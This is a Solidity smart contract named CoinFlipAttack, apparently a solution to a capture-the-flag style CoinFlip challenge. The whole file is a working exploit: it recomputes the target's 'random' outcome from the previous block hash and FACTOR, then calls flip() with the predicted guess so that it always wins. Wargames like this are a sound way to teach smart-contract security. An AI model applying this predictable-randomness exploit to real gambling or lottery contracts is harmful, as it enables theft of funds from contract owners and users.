// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.0/contracts/math/SafeMath.sol"; 
import './CoinFlip.sol';

contract CoinFlipAttack {
    using SafeMath for uint256;
    CoinFlip public coinFlipContract;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinFlipContract) public{
        coinFlipContract = CoinFlip(_coinFlipContract);
    }
    function makeGuess() public {

        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool guess = coinFlip == 1 ? true : false;

        coinFlipContract.flip(guess);
    }
}
